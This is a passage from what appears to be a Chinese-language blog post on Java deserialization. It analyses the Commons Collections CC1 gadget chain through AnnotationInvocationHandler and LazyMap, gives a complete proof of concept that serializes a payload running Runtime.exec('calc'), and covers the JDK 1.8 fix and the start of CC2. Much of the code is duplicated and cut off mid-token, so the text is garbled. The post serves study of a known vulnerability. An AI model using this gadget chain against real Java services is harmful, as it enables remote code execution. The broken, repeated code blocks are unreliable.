class="hljs-keyword">this</span>.memberValues.get(var4);<br>                <span class="hljs-keyword">if</span> (var6 == <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IncompleteAnnotationException(<span class="hljs-keyword">this</span>.type, var4);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var6 <span class="hljs-keyword">instanceof</span> ExceptionProxy) &#123;<br>                    <span class="hljs-keyword">throw</span> ((ExceptionProxy)var6).generateException();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="hljs-number">0</span>) &#123;<br>                        var6 = <span class="hljs-keyword">this</span>.cloneArray(var6);<br>                    &#125;<br><br>                    <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">6182022883658399397L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Method[] memberMethods = <span class="hljs-keyword">null</span>;<br><br>    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        <span class="hljs-keyword">this</span>.type = var1;<br>        <span class="hljs-keyword">this</span>.memberValues = var2;<br>    &#125;<br> <br>		<span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;<br>        String var4 = var2.getName();<br>        Class[] var5 = var2.getParameterTypes();<br>        <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">assert</span> var5.length == <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.toStringImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.hashCodeImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;annotationType&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.type;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              <br>              	<span class="hljs-comment">// 重点在这里，执行了Map的get方法，所以可以使用LazyMap</span><br>                Object var6 = <span class="hljs-keyword">this</span>.memberValues.get(var4);<br>                <span class="hljs-keyword">if</span> (var6 == <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IncompleteAnnotationException(<span class="hljs-keyword">this</span>.type, var4);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var6 <span class="hljs-keyword">instanceof</span> ExceptionProxy) &#123;<br>                    <span class="hljs-keyword">throw</span> ((ExceptionProxy)var6).generateException();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="hljs-number">0</span>) &#123;<br>                        var6 = <span class="hljs-keyword">this</span>.cloneArray(var6);<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> var6;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>看AnnotationInvocationHandler的readObject方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-comment">//AnnotationInvocationHandler.java</span><br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; type;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br> <br><br><span class="hljs-comment">// 构造方法</span><br>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>    <span class="hljs-keyword">this</span>.type = type;<br>    <span class="hljs-keyword">this</span>.memberValues = memberValues;<br>&#125;<br> <br> <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>      	<span class="hljs-comment">// 重点在这，readObject执行到this.memberValues.entrySet()会去构造出来this.memberValues</span><br>      	<span class="hljs-comment">// 如果this.memberValues 是通过代理创建出来的AnnotationInvocationHandler实例</span><br>      	<span class="hljs-comment">// this.memberValues.entrySet方法调用时就会执行上面的invoke方法，也就是会执行map.get触发lazyMap</span><br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Map.Entry var5 = (Map.Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string"><code class="language-hljs java"><span class="hljs-comment">//AnnotationInvocationHandler.java</span><br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; type;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br> <br><br><span class="hljs-comment">// 构造方法</span><br>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>    <span class="hljs-keyword">this</span>.type = type;<br>    <span class="hljs-keyword">this</span>.memberValues = memberValues;<br>&#125;<br> <br> <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>      	<span class="hljs-comment">// 重点在这，readObject执行到this.memberValues.entrySet()会去构造出来this.memberValues</span><br>      	<span class="hljs-comment">// 如果this.memberValues 是通过代理创建出来的AnnotationInvocationHandler实例</span><br>      	<span class="hljs-comment">// this.memberValues.entrySet方法调用时就会执行上面的invoke方法，也就是会执行map.get触发lazyMap</span><br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Map.Entry var5 = (Map.Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">"]"</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure>

<p>所以readObject方法中调用了this.memberValues.entrySet()，这个this.memberValues是被动态代理创建的，会进入代理类的invoke函数，而代理类又是AnnotationInvocationHandler，那就会调用上面的invoke方法，进而调用代理类内部map的get方法(也就是this.memberValues.get(var4)这一行)，而代理类的memberValues=lazyMap的话，直接就形成利用链了</p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre class=" language-hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;String, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-comment">// 获取构造函数</span><br>        Constructor&lt;?&gt; constructor = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">// 创建代理类</span><br>        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);<br>        <span class="hljs-comment">// 动态代理，创建lazyMap实例</span><br>        Map map1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);<br><br>        <span class="hljs-comment">// 创建被反序列化的AnnotationInvocationHandler类</span><br>        Object aa =  constructor.newInstance(Override.class, map1);<br><br>        <span class="hljs-comment">// 本地写文件</span><br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        out.writeObject(aa);<br>        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string"><code class="language-hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;String, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-comment">// 获取构造函数</span><br>        Constructor&lt;?&gt; constructor = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">// 创建代理类</span><br>        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);<br>        <span class="hljs-comment">// 动态代理，创建lazyMap实例</span><br>        Map map1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);<br><br>        <span class="hljs-comment">// 创建被反序列化的AnnotationInvocationHandler类</span><br>        Object aa =  constructor.newInstance(Override.class, map1);<br><br>        <span class="hljs-comment">// 本地写文件</span><br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        out.writeObject(aa);<br>        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"serialize.ser"</span>));<br>        in.readObject();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>调用连:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>readObject<br>	memberValues.entry<span class="hljs-constructor">Set()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>memberValues.get(xx) <br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier"><code class="language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>readObject<br>	memberValues.entry<span class="hljs-constructor">Set()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>memberValues.get(xx) <br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform(xx)<br></code></pre></td></tr></table></figure>



<p>JDK1.8的修复，在readObject中 <code>Iterator var4 = this.memberValues.entrySet().iterator();</code> 换成了<code>Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</code>  不会再去执行invoke函数，也没有触发lazyMap的点了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream.GetField fields = s.readFields();<br><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(<span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        AnnotationType annotationType = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(t);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>        <span class="hljs-comment">// consistent with runtime Map type</span><br>        Map&lt;String, Object&gt; mv = <span class="hljs-keyword">new</span> LinkedHashMap&lt;&gt;();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;<br>            String name = memberValue.getKey();<br>            Object value = <span class="hljs-keyword">null</span>;<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                value = memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    value = <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name));<br>                &#125;<br>            &#125;<br>            mv.put(name, value);<br>        &#125;<br><br>        UnsafeAccessor.setType(<span class="hljs-keyword">this</span>, t);<br>        UnsafeAccessor.setMemberValues(<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream.GetField fields = s.readFields();<br><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(<span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        AnnotationType annotationType = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(t);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>        <span class="hljs-comment">// consistent with runtime Map type</span><br>        Map&lt;String, Object&gt; mv = <span class="hljs-keyword">new</span> LinkedHashMap&lt;&gt;();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;<br>            String name = memberValue.getKey();<br>            Object value = <span class="hljs-keyword">null</span>;<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                value = memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    value = <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name));<br>                &#125;<br>            &#125;<br>            mv.put(name, value);<br>        &#125;<br><br>        UnsafeAccessor.setType(<span class="hljs-keyword">this</span>, t);<br>        UnsafeAccessor.setMemberValues(<span class="hljs-keyword">this</span>, mv);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>这个CC1很巧妙，也很不容易理解。</p>
<h2 id="0x3-2-Commons-Collections2"><a href="#0x3-2-Commons-Collections2" class="headerlink" title="0x3.2 Commons Collections2"></a>0x3.2 Commons Collections2</h2><p>限制：</p>
<ul>
<li><p>CommonsCollections 4.0</p>
</li>
<li><p>JDK版本：暂无限制</p>
</li>
<li><p>需要有 javasist 依赖</p>
</li>
</ul>
<p>cc2中利用的是cc4.0，因为cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformingComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span> </span>&#123;<br>  	<span class="hljs-keyword">protected</span> Comparator decorated;<br>  	<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformingComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span> </span>&#123;<br>  	<span class="hljs-keyword">protected</span> Comparator decorated;<br>  	<span class="hljs-keyword">protected</span> Transformer transformer;<br><br></code></pre></td></tr></table></figure>

<p>POM依赖，需要javassist进行一些字节码的操作：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span 